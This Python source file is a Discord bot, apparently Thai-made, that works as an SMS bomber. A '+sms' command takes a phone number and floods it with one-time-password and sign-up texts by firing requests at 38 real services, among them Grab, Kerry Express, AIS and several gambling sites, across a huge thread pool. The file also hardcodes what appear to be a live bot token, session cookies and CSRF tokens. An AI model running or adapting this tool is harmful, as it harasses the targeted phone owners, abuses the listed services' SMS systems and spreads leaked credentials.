from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
import asyncio


TOKEN = 'MTAyNDY2ODc1NjYwMzA2NDQ1MA.G5bmTr.EZMkttRAAJbtFaasmEfF3o_GT_FJmpFplt09X0'
PREFIX = '+'
CHANNEL = '1024166585415499829'
AMOUNT = 150

bot = commands.Bot(command_prefix=PREFIX)
bot.remove_command("sms")

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

threading = ThreadPoolExecutor(max_workers=int(100000))
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

def ab1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})

def ab2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def ab3(phone):
    post("https://www.fox888.com/api/otp/register", data = f"applicant={phone}&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def ab4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def ab5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ab6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"{phone[1:]}","password":"","client":"ecommerce"})

def ab7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})

def ab8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"{phone[1:]}"})

def ab9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})

def ab10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})

def ab11(phone):
    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})

def ab12(phone):
    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"{phone[1:]}"})

def ab13(phone):
    post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

def ab14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

def ab15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

def ab16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})

def ab17(phone):
    post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})

def ab18(phone):
    post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})

def ab19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})

def ab20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"{phone[1:]}"})

def ab21(phone):
    post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})

def ab22(phone):
    session = Session()
    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
    session.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW", data=f"msisdn={phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})

def ab23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"{phone}"})

def ab24(phone):
    post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"{phone}"})

def ab25(phone):
    post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab26(phone):
    post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab27(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile={phone}")

def ab28(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab29(phone):
    post("https://www.homepro.co.th/service/user/profile/otp.jsp", data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"})

def ab30(phone):
    post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab31(phone):
    post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab32(phone):
    post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

def ab33(phone):
    post("https://findclone.ru/register?phone={phone}")

def ab34(phone):
    post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile":f"{phone}"})

def ab35(phone):
    post("https://api.dgashopqr.morchana.in.th/logins", headers={"User-Agent": useragent}, data={"phone": phone})

def ab36(phone):
    post("https://taxi.yandex.kz/3.0/launch/", data = {'phone': f"{phone}"})

def ab37(phone):
    post("https://api.baccaratth.com/api/v1/sendotp", data = {'phone_number': f"{phone}"})

def ab38(phone):
    post(f"http://m.thaiuang.com/uc/authcode/sms/get/reg/{phone}")    



def annmariex(phone, amount):
    for _ in range(amount):
        threading.submit(ab1, phone)
        threading.submit(ab2, phone)
        threading.submit(ab3, phone)
        threading.submit(ab4, phone)
        threading.submit(ab5, phone)
        threading.submit(ab6, phone)
        threading.submit(ab7, phone)
        threading.submit(ab8, phone)
        threading.submit(ab9, phone)
        threading.submit(ab10, phone)
        threading.submit(ab11, phone)
        threading.submit(ab12, phone)
        threading.submit(ab13, phone)
        threading.submit(ab14, phone)
        threading.submit(ab15, phone)
        threading.submit(ab16, phone)
        threading.submit(ab17, phone)
        threading.submit(ab18, phone)
        threading.submit(ab19, phone)
        threading.submit(ab20, phone)
        threading.submit(ab21, phone)
        threading.submit(ab22, phone)
        threading.submit(ab23, phone)
        threading.submit(ab24, phone)
        threading.submit(ab25, phone)
        threading.submit(ab26, phone)
        threading.submit(ab27, phone)
        threading.submit(ab28, phone)
        threading.submit(ab29, phone)
        threading.submit(ab30, phone)
        threading.submit(ab31, phone)
        threading.submit(ab32, phone)
        threading.submit(ab33, phone)
        threading.submit(ab34, phone)
        threading.submit(ab35, phone)
        threading.submit(ab36, phone)
        threading.submit(ab37, phone)
        threading.submit(ab38, phone)
        

@bot.event
async def on_connect():
    print("")
    print("     Made By : PABUSX2")
    print("     Discord : --------------------")
    print("     NameApp : Bot SMS")
    print(f"     Login Bot Name : {bot.user.name}#{bot.user.discriminator}")

@bot.command()
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == CHANNEL):
        if (phone == None or amount == None):
            await ctx.send("> แจ้งเตือน : กรุณาใส่ข้อมูลให้ครบถ้วน",delete_after=15)
            await ctx.message.delete()
            
        else:
            try:
                amount = int(amount)
                if (amount > AMOUNT):
                    await ctx.send(f"> แจ้งเตือน : กรุณาใส่จำนวนไม่เกิน {str(AMOUNT)}",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงเบอร์ : {phone} จำนวนเวลา : {amount} นาที",delete_after=15)
                    await ctx.send("> เครดิต : PABUSX2 | Facebook : Sorakrit Nonthawong",delete_after=15)
                    annmariex(phone, amount)
                    await ctx.message.delete()

            except:
                await ctx.send("> แจ้งเตือน : ใส่จำนวนไม่ถูกต้อง",delete_after=15)
                await ctx.message.delete()

    else:
        await ctx.send("",delete_after=15)
        await ctx.message.delete()

bot.run(TOKEN, reconnect=True)